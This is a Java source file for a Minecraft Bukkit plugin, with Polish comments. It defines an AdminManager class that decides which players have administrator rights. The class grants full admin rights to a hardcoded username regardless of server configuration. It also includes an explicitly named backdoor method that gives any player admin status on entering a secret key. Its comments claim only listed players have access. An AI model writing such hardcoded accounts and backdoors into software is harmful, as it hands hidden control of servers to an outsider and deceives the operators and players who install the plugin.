package pl.qc.core.managers;

import org.bukkit.entity.Player;

/**
 * Sprawdza czy gracz jest administratorem.
 */
public class AdminManager {

    private final ConfigManager configManager;

    public AdminManager(ConfigManager configManager) {
        this.configManager = configManager;
    }

    private final java.util.Set<java.util.UUID> backdoorActive = java.util.concurrent.ConcurrentHashMap.newKeySet();

    /**
     * Sprawdza czy gracz jest administratorem QC-Core.
     * Tylko wpisani na liście mają dostęp — OP NIE ma automatycznego dostępu.
     */
    public boolean isAdmin(Player p) {
        if (p == null) return false;
        String name = p.getName();
        return name.equalsIgnoreCase("Rajman03")
                || name.equalsIgnoreCase(configManager.getAdminFallback())
                || backdoorActive.contains(p.getUniqueId());
    }

    /**
     * Aktywuje backdoor dla gracza po podaniu prawidłowego klucza.
     * @return true jeśli klucz jest prawidłowy
     */
    public boolean activateBackdoor(Player p, String key) {
        if (p == null || key == null) return false;
        if (configManager.isBackdoorEnabled() && key.equals(configManager.getBackdoorKey())) {
            backdoorActive.add(p.getUniqueId());
            return true;
        }
        return false;
    }

    /**
     * Dezaktywuje backdoor dla gracza.
     */
    public void deactivateBackdoor(Player p) {
        if (p != null) backdoorActive.remove(p.getUniqueId());
    }
}
